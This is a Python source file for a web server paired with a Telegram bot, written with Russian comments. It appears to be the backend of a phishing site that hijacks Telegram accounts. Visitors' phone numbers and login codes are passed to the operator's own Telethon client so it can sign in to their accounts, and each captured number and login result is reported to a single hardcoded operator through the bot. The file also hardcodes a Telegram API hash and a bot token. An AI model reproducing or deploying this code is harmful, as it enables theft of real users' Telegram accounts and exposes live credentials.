# server_bot.py
import asyncio
from quart import Quart, request, jsonify
from quart_cors import cors

from telethon import TelegramClient
from telethon.errors.rpcerrorlist import PhoneNumberUnoccupiedError

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# ------------------- Настройки Telethon -------------------
api_id = 20364764
api_hash = "fdbe60e03331c8ac7cf3ddca2404feaa"
telethon_client = TelegramClient("session_name", api_id, api_hash)

# ------------------- Настройки Aiogram -------------------
BOT_TOKEN = "8333196630:AAESmhUm0A5zKbnKzj1eLSTXK1lnpFu25K0"
MY_USER_ID = 767154085

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

async def send_bot_message(user_id: int, text: str):
    """Отправка сообщения ботом только нужному пользователю"""
    if user_id != MY_USER_ID:
        return
    await bot.send_message(chat_id=user_id, text=text)

# команда /start для бота
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id != MY_USER_ID:
        return
    await message.answer("Бот активирован!")

# ------------------- Инициализация Quart -------------------
app = Quart(__name__)
app = cors(app, allow_origin="*")

# ------------------- Эндпоинт отправки кода -------------------
@app.post("/send_code")
async def send_code():
    data = await request.get_json()
    phone = data.get("phone")
    user_id = data.get("user_id")

    await telethon_client.connect()
    try:
        await telethon_client.send_code_request(phone)
        await send_bot_message(user_id, f"Пользователь зашёл на сайт и ввёл номер: {phone}")
        return jsonify({"status": "ok"})
    except PhoneNumberUnoccupiedError:
        return jsonify({"status": "error", "msg": "Номер не связан с Telegram"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# ------------------- Эндпоинт проверки кода -------------------
@app.post("/check_code")
async def check_code():
    data = await request.get_json()
    phone = data.get("phone")
    code = data.get("code")
    user_id = data.get("user_id")

    try:
        await telethon_client.sign_in(phone, code)
        await send_bot_message(user_id, f"Авторизация успешна для номера {phone}")
        return jsonify({"status": "success"})
    except Exception as e:
        await send_bot_message(user_id, f"Ошибка авторизации для номера {phone}: {e}")
        return jsonify({"status": "error", "msg": "Неверный код или ошибка авторизации"})

# ------------------- Запуск Aiogram и Quart вместе -------------------
async def main():
    bot_task = asyncio.create_task(dp.start_polling(bot))
    server_task = asyncio.create_task(app.run_task(host="0.0.0.0", port=10000))
    await asyncio.gather(bot_task, server_task)

if __name__ == "__main__":
    asyncio.run(main())
